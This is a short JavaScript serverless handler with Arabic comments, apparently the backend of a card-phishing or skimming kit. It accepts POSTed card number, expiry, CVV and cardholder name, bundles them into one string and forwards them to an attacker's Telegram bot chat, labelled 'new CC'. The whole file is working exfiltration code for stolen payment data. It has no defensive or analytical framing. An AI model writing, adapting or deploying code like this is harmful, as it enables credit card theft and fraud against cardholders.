exports.handler = async (event) => {
  if (event.httpMethod !== 'POST') return { statusCode: 405 };
  
  const { cc_num, cc_exp, cc_cvv, cc_name } = JSON.parse(event.body);
  const cc_data = `${cc_num}|${cc_exp}|${cc_cvv}|${cc_name}`;
  
  // أرسل لتليجرام بوتك
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: YOUR_CHAT_ID,  // chat ID بتاعك
      text: `🎁 CC جديد: ${cc_data}`
    })
  });
  
  return { statusCode: 200, body: 'CC received!' };
};
